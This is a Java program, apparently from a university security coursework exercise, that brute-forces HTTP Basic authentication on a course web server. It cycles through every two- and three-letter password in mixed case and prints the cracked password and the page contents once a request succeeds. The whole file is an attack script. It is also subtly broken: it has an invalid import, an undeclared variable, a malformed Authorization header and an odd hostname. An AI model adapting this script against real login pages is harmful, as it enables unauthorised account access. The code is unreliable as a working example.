

import java.awt.*;
import java.String;
import java.util.*;
import java.io.*;
import java.net.*;



public class BruteForce
{
   private URL url;
   private HttpURLConnection connection ;
   private  int stopTime = 0;
   private  int startTime = 0;
   private  int count = 0;

   public BruteForce()
   {
      System.out.println("Process is running...");
      startTime = System.currentTimeMillis();
      threeLetters();
      twoLetters();
   }

   public static void main (String args[])
   {
      BruteForce bf = new BruteForce();
   }
   
   public void threeLetters()
   {
      String s1;
      char [] a = {'a','a','a'};

      for (int i0 = 0; i0 < 26; i0++)
      {
         for (int i1 = 0; i1 < 26; i1++)
         {
            for (int i2 = 0; i2 < 26; i2++)
            {
               s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1)) +
		            String.valueOf((char)(a[2] + i2));
               decision(s1);
               count++;

               s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1)) +
                    (String.valueOf((char)(a[2] + i2))).toUpperCase();
               decision(s1);
               count++;

               s1 = String.valueOf((char)(a[0] + i0)) + (String.valueOf((char)(a[1] + i1))).toUpperCase() +
                    (String.valueOf((char)(a[2] + i2))).toUpperCase();
               decision(s1);
               count++;

               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() +
                    (String.valueOf((char)(a[1] + i1))).toUpperCase() +
                    (String.valueOf((char)(a[2] + i2))).toUpperCase();
               decision(s1);
               count++;

               s1 = (String.valueOf((char)(a[0] + i0))) + (String.valueOf((char)(a[1] + i1))).toUpperCase() +
                    String.valueOf((char)(a[2] + i2));
               decision(s1);
               count++;

               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() + String.valueOf((char)(a[1] + i1)) +
		            String.valueOf((char)(a[2] + i2));
               decision(s1);
               count++;

               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() + String.valueOf((char)(a[1] + i1)) +
                    (String.valueOf((char)(a[2] + i2))).toUpperCase();
               decision(s1);
               count++;

               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() +
                    (String.valueOf((char)(a[1] + i1))).toUpperCase() + String.valueOf((char)(a[2] + i2));
               decision(s1);
               count++;
            }
         }
      }
   }
   
   public void twoLetters()
   {
      String s1;
      char [] a = {'a','a'};

      for (int i0 = 0; i0 < 26; i0++)
      {
         for (int i1 = 0; i1 < 26; i1++)
         {
            s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1));
            decision(s1);
            count++;

            s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1)).toUpperCase();
            decision(s1);
            count++;

            s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() +
                 (String.valueOf((char)(a[1] + i1))).toUpperCase();
            decision(s1);
            count++;

            s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() + String.valueOf((char)(a[1] + i1));
            decision(s1);
            count++;
         }
      }
   }

   
   public void decision(String s1)
   {
      if (find(s1) == 200)
      {
         stopTime = System.currentTimeMillis();
          runTime = stopTime - startTime;
         System.out.println("***************************************");
         System.out.println("\nAttack successfully");
         System.out.println("\nPassword is: " + s1);
         System.out.println("\nThe contents of the Web site: ");
         displayContent(s1);
         System.out.println("\nTime taken  crack: " + runTime + " millisecond");
         System.out.println("\nNumber of attempts: " + count);
         System.out.println();

         System.exit(0);
      }
   }
   
   
   public int find(String s1)
   {
      int responseCode = 0;
      try
      {
         url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
         connection = (HttpURLConnection)url.openConnection();

         connection.setRequestProperty("Authorization"," " + MyBase64.encode("" + ":" + s1));

         responseCode = connection.getResponseCode();

      }catch (Exception e)
      {
          System.out.println(e.getMessage());
      }
      return responseCode;
   }

   
   public void displayContent(String pw)
   {
      BufferedReader bw = null ;
      try
      {
         url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
         connection = (HttpURLConnection)url.openConnection();

         connection.setRequestProperty("Authorization"," " + MyBase64.encode("" + ":" + pw));
         InputStream stream = (InputStream)(connection.getContent());
         if (stream != null)
         {
             InputStreamReader reader = new InputStreamReader (stream);
             bw = new BufferedReader (reader);
             String line;

             while ((line = bw.readLine()) != null)
             {
                System.out.println(line);
             }
        }
      }
      catch (IOException e)
      {
         System.out.println(e.getMessage());
      }
   }
}




